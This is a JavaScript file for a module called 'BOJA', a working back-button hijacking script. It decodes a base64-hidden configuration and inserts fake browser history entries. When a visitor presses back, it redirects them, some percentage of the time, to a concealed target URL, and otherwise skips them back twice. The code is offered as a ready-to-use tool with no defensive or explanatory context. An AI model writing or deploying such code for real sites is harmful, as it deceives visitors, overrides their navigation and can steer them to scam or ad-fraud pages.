(function (root, factory) {
    root.BOJA = factory(root.BOJA);
}(this, function () {
    'use strict';
    var exports = {},
        w = window,
        d = document;

    var X = {};
    X.code = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    X.decode = function(str, utf8decode) {
        utf8decode =  (typeof utf8decode == 'undefined') ? false : utf8decode;
        var o1, o2, o3, h1, h2, h3, h4, bits, d=[], plain, coded;
        var b64 = X.code;

        coded = utf8decode ? Utf8.decode(str) : str;

        for (var c=0; c<coded.length; c+=4) {
            h1 = b64.indexOf(coded.charAt(c));
            h2 = b64.indexOf(coded.charAt(c+1));
            h3 = b64.indexOf(coded.charAt(c+2));
            h4 = b64.indexOf(coded.charAt(c+3));

            bits = h1<<18 | h2<<12 | h3<<6 | h4;

            o1 = bits>>>16 & 0xff;
            o2 = bits>>>8 & 0xff;
            o3 = bits & 0xff;

            d[c/4] = String.fromCharCode(o1, o2, o3);
            if (h4 == 0x40) d[c/4] = String.fromCharCode(o1, o2);
            if (h3 == 0x40) d[c/4] = String.fromCharCode(o1);
        }
        plain = d.join('');

        return utf8decode ? Utf8.decode(plain) : plain;
    };

    var on = function(el, eventName, handler) {
        if (el.addEventListener) {
            el.addEventListener(eventName, handler);
        } else {
            el.attachEvent('on' + eventName, function () {
                handler.call(el);
            });
        }
    };

    var cb = function(e) {
        if(e.state && e.state.hasOwnProperty('cfg')) {
            if(e.state.cfg.target && (parseInt(sessionStorage.getItem('boja_time')) + (parseInt(e.state.cfg.timeout) * 1000)) >= new Date().getTime() && Math.floor((Math.random() * 100) + 1) <= e.state.cfg.percent ) {
                window.location.href = e.state.cfg.target;
            } else {
                window.history.back();
                window.history.back();
            }
        }
        return false;
    };

    on(w, 'popstate', cb);

    exports.init = function(config_str) {
        var cfg = false;
        try {
            cfg = JSON.parse(X.decode(config_str));
        } catch(err) {
            return;
        }

        cfg['repo'] = cfg.hasOwnProperty('repo') ? parseInt(cfg.repo) : 1;
        cfg['timeout'] = cfg.hasOwnProperty('timeout') ? parseInt(cfg.timeout) : 1;
        cfg['target'] = cfg.hasOwnProperty('target') ? cfg.target : false;
        cfg['percent'] = cfg.hasOwnProperty('percent') ? cfg.percent : 100;


        var cur_hash_tag = window.location.hash;

        if(typeof history == "object" && typeof history.pushState == "function" && typeof sessionStorage == "object" && typeof sessionStorage.getItem == "function") {
            if(!sessionStorage.getItem('boja_time')) {
                sessionStorage.setItem('boja_time', new Date().getTime());
            } else if(cfg.repo == 1) {
                return exports;
            }

            history.pushState({
                cfg: cfg
            }, d.title, cur_hash_tag);
            history.pushState({
                cfg: cfg
            }, d.title, cur_hash_tag);
        }

    };

    return exports;
}));